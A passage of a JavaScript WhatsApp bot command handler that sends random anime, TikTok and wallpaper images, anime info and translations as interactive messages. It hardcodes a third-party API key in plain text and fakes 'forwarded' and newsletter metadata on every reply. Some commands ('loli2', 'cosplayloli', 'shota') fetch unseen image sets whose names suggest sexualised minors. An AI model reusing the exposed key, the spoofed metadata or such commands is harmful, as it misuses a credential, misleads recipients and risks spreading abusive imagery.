          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomgirl':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomboy':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'thai':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'vietnamese':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'indo':{
await VeranStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break

//------------------------------------------------------------------------------------------------//
//Anime Cmds
case 'anime': {
  // Get the anime name from the user's input
  let queryText = args.join(' ');

  // Check if queryText is provided
  if (!queryText) {
      return await VeranBotInc.sendText(m.chat, "Please provide the name of the anime.");
  }

  // Define the API URL with the user's query
  const apiUrl = `https://api.lolhuman.xyz/api/anime?apikey=dcb4198762eb793a386a9c1c&query=${encodeURIComponent(queryText)}`;

  // Fetch data from the API
  let response;
  try {
      response = await fetch(apiUrl);
      let data = await response.json();

      if (data.status !== 200 || !data.result || data.result.length === 0) {
          return await VeranBotInc.sendText(m.chat, "Failed to fetch anime details. Please check the query and try again.");
      }

      let anime = data.result[0];

      // Extract relevant data with safety checks
      let title = anime.title?.english || anime.title?.romaji || anime.title?.native || 'Unknown Title';
      let description = anime.description || 'No description available.';
      let coverImage = anime.coverImage?.large || 'https://via.placeholder.com/500';
      let genres = anime.genres?.join(', ') || 'Unknown';
      let status = anime.status || 'Unknown';
      let episodes = anime.episodes || 'Unknown';
      let duration = anime.duration || 'Unknown';
      let startDate = anime.startDate ? `${anime.startDate.year}-${anime.startDate.month}-${anime.startDate.day}` : 'N/A';
      let endDate = anime.endDate ? `${anime.endDate.year}-${anime.endDate.month}-${anime.endDate.day}` : 'N/A';

      // Delay function to throttle requests
      function delay(ms) {
          return new Promise(resolve => setTimeout(resolve, ms));
      }

      // Translate function with retry logic
      async function translateText(text, targetLang) {
          let retries = 5;
          while (retries > 0) {
              try {
                  await delay(500); // Delay between requests
                  let result = await translate(text, { to: targetLang });
                  return result.text;
              } catch (error) {
                  console.error('Translation error:', error);
                  if (error.message.includes('TooManyRequestsError')) {
                      await delay(10000); // Wait for 10 seconds before retrying
                  } else {
                      return text; // Return original text if translation fails
                  }
                  retries -= 1;
              }
          }
          return text; // Return original text if all retries fail
      }

      // Translate description to Urdu
      let translatedDescription = await translateText(description, 'ur');

      // Create the caption with translations
      let captionText = `
*Title:* ${title}

❃ Genres: ${genres}
❃ Status: ${status}
❃ Episodes: ${episodes}
❃ Duration: ${duration} minutes per episode
❃ Start Date: ${startDate}
❃ End Date: ${endDate}

*Description:* ${translatedDescription}
`.trim();

      // Create a message with design
      let msgs = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
              message: {
                  "messageContextInfo": {
                      "deviceListMetadata": {},
                      "deviceListMetadataVersion": 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                      body: proto.Message.InteractiveMessage.Body.create({
                          text: captionText
                      }),
                      footer: proto.Message.InteractiveMessage.Footer.create({
                          text: botname
                      }),
                      header: proto.Message.InteractiveMessage.Header.create({
                          hasMediaAttachment: false,
                          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
                      }),
                      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                          buttons: [{
                              "name": "quick_reply",
                              "buttonParamsJson": `{\"display_text\":\"🌟\",\"id\":\""}`
                          }],
                      }),
                      contextInfo: {
                          mentionedJid: [m.sender], 
                          forwardingScore: 999,
                          isForwarded: true,
                          forwardedNewsletterMessageInfo: {
                              newsletterJid: '100000000000000000@newsletter',
                              newsletterName: ownername,
                              serverMessageId: 143
                          }
                      }
                  })
              }
          }
      }, { quoted: m });

      // Send the message
      return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
  } catch (error) {
      console.error('API Fetch Error:', error);
      return await VeranBotInc.sendText(m.chat, "An error occurred while fetching the anime details.");
  }
}
break;


//------------------------------------------------------------------------------------------------//

			case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await VeranStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: yeha}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'translate':{
  	if (!q) return replygcveran(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: result.text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
    } catch (e) {
        return replygcveran(err)
    } 
    }
    break
    case 'coffee': case 'kopi': {
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: 'https://coffee.alexflipnote.dev/random'} }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'wallpaper': {
                if (!text) return replygcveran('Enter Query Title')
                await VeranStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: VeranBotInc.waUploadToServer })
          }),
